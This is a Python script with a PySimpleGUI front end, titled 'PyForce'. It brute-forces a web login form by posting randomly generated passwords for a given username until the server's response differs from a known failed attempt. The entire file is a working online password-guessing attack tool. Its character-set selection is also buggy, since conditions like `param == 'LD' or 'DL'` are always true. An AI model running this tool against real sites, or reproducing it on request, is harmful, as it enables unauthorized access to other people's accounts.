# -*- coding: utf-8 -*-
import requests
from password_generator import PasswordGenerator
import PySimpleGUI as sg

sg.theme('DarkBlue7')
layout = [
    [sg.Text('URL', size=(11, 1)), sg.InputText('', size=(27, 1))],
    [sg.Text('Username', size=(11, 1)), sg.InputText('', size=(27, 1))],
    [sg.Text('Value (usrnm)', size=(11, 1)), sg.InputText('', size=(27, 1))],
    [sg.Text('Value (pswrd)', size=(11, 1)), sg.InputText('', size=(27, 1))],
    [sg.Text('Length', size=(11, 1)), sg.InputText('', size=(27, 1))],
    [sg.Text('Param', size=(11, 1)), sg.InputText('', size=(27, 1))],
    [sg.Submit(button_text='go')]
]
window = sg.Window('PyForce', layout)

def gen(i, param):
    pwo = PasswordGenerator()
    if param == "U":
        return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ', i)
    elif param == "L":
        return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz', i)
    elif param == "D":
        return pwo.shuffle_password('1234567890', i)
    elif param == "LD" or "DL":
        return pwo.shuffle_password('abcdefghijklmnopqrstuvwxyz1234567890', i)
    elif param == "UD" or "DU":
        return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', i)
    elif param == "UL" or "LU":
        return pwo.shuffle_password('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', i)
    else:
        return pwo.shuffle_password("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890", i)

def bruteforce(url, usr, usrnmvalue, pswrdvalue, length, param):
    count = 0
    status = requests.get(url)
    status.raise_for_status()

    while True:
        pas = gen(length, param)
        print(pas)

        message = [(usrnmvalue, usr), (pswrdvalue, pas)]
        req = requests.post(url, data=message)

        test = [(usrnmvalue, usr), (pswrdvalue, " ")]
        get = requests.post(url, data=test)

        count = count + 1
        if get.text != req.text:
            print("Success!")
            print("Found password after " + str(count) + " times")
            print("Username:", usr, "Password:", pas)
            exit()

while True:
    event, values = window.read()

    if event is None:
        print('exit')
        break

    if event == "go":
        url = values[0]
        usr = values[1]
        usrnmvalue = values[2]
        pswrdvalue = values[3]
        length = int(values[4])
        param = values[5]

        bruteforce(url, usr, usrnmvalue, pswrdvalue, length, param)

window.close()
